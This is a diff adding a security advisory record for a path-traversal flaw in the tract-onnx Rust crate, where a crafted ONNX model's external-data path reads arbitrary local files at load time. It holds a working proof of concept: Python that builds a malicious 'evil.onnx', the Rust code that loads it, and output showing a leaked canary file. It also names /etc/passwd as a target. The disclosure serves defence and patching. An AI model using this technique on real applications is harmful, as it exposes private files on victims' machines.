@@ -1,0 +1,91 @@
+{
+  "id": "GHSA-h668-6x6g-f8r5",
+  "modified": "2026-06-19T15:00:15.201720165Z",
+  "published": "2026-06-19T14:45:43Z",
+  "aliases": [
+    "CVE-2026-55832"
+  ],
+  "summary": "tract: Arbitrary file read via unsanitized ONNX external_data `location` (path traversal) on model load in tract-onnx",
+  "details": "### Summary\n\n`tract` (the `tract-onnx` crate) resolves an ONNX tensor's external-data `location` by joining it onto the model directory **without any sanitization**. Because `location` comes from the (untrusted) `.onnx` file, a malicious model can make `tract` open and read an **arbitrary local file** at load time, with the file's contents flowing into the model's tensors / inference output (read-only file disclosure). This is the ONNX external-data path-traversal class that the reference `onnx` library hardened over several CVEs; `tract` resolves `location` itself and was never hardened.\n\n### Details\n\nIn `onnx/src/tensor.rs`, `get_external_resources()` builds the path with no checks:\n\n```rust\nlet location = /* tensor.external_data \"location\" value — attacker-controlled */;\nlet p = PathBuf::from(path).join(location);          // no is_absolute / \"..\" / canonicalize / containment check\nprovider.read_bytes_from_path(\u0026mut tensor_data, \u0026p, offset, length)?;   // Mmap::map(File::open(p)) by default\n```\n\n- `Path::join` with an **absolute** `location` (e.g. `/etc/passwd`) discards the base directory → `p = /etc/passwd`.\n- A **relative** `../../../../etc/passwd` value is not normalized → directory traversal.\n- The default `MmapDataResolver` (`onnx/src/data_resolver.rs`) then `mmap`s the file and copies `mmap[offset..offset+length]` into the tensor. `offset`/`length` are also taken from the file; an out-of-range slice **panics** (DoS).\n\nNo `is_absolute`, `..`, `canonicalize`, or containment check exists anywhere on this path (`tensor.rs`, `model.rs`, `data_resolver.rs`).\n\nReachable from the standard public API: `model_for_path(p)` (`onnx/src/model.rs`) sets `model_dir = p.parent()` and calls `load_tensor(proto, model_dir)` → `get_external_resources(.., model_dir)`.\n\n### PoC\n\nTested on `tract-onnx 0.21.16` (crates.io), Rust 1.96.\n\n1. A canary file the model must not be able to read:\n   `/tmp/tract_canary_secret.txt` → `TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b`\n2. Build a small `evil.onnx` with a `UINT8[37]` initializer whose `external_data` is `location=/tmp/tract_canary_secret.txt` (absolute), `offset=0`, `length=37`, fed through `Identity` to the output (raw protobuf serialization):\n\n```python\nimport onnx\nfrom onnx import helper, TensorProto, StringStringEntryProto\nN = 37; LOC = \"/tmp/tract_canary_secret.txt\"      # absolute -\u003e Path::join discards the base dir\nw = TensorProto(); w.name = \"W\"; w.data_type = TensorProto.UINT8\nw.dims.extend([N]); w.data_location = TensorProto.EXTERNAL\nfor k, v in [(\"location\", LOC), (\"offset\", \"0\"), (\"length\", str(N))]:\n    e = StringStringEntryProto(); e.key = k; e.value = v; w.external_data.append(e)\nnode = helper.make_node(\"Identity\", [\"W\"], [\"Y\"])\nout = helper.make_tensor_value_info(\"Y\", TensorProto.UINT8, [N])\ng = helper.make_graph([node], \"g\", [], [out], initializer=[w])\nm = helper.make_model(g, opset_imports=[helper.make_opsetid(\"\", 13)])\nopen(\"evil.onnx\", \"wb\").write(m.SerializeToString())\n```\n\n3. Victim loads the untrusted model with the standard API:\n\n```rust\nlet model = tract_onnx::onnx().model_for_path(\"evil.onnx\")?;\nlet out = model.into_optimized()?.into_runnable()?.run(tvec!())?;\nlet bytes: Vec\u003cu8\u003e = out[0].to_array_view::\u003cu8\u003e()?.iter().cloned().collect();\nprintln!(\"{:?}\", String::from_utf8_lossy(\u0026bytes));\n```\n\nOutput:\n\n```\n\"TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b\"\n```\n\ni.e. the contents of the arbitrary local file were read by `tract` and surfaced in the inference output.\n\n### Impact\n\nRead-only arbitrary local file disclosure when an application uses `tract` to load an untrusted or shared ONNX model (model hubs, multi-file repos, user uploads). The file content is recoverable from the model's tensors / inference output. Secondary: denial of service (panic) via out-of-bounds `offset`/`length`. No write or code execution.\n\n### Suggested fix\n\nReject absolute `location` and any `..` component, then canonicalize and verify the resolved path stays within the model directory (mirroring `onnx` 1.22.0's `resolve_external_data_location`); reject symlinks; validate `offset`/`length` against the file size before slicing.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "tract-onnx",
+        "purl": "pkg:cargo/tract-onnx"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.21.17"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-h668-6x6g-f8r5/GHSA-h668-6x6g-f8r5.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "tract-onnx",
+        "purl": "pkg:cargo/tract-onnx"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.22.0"
+            },
+            {
+              "fixed": "0.22.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-h668-6x6g-f8r5/GHSA-h668-6x6g-f8r5.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "tract-onnx",
+        "purl": "pkg:cargo/tract-onnx"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.23.0"
+            },
+            {
+              "fixed": "0.23.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-h668-6x6g-f8r5/GHSA-h668-6x6g-f8r5.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/sonos/tract"
+    }
+  ]
+}
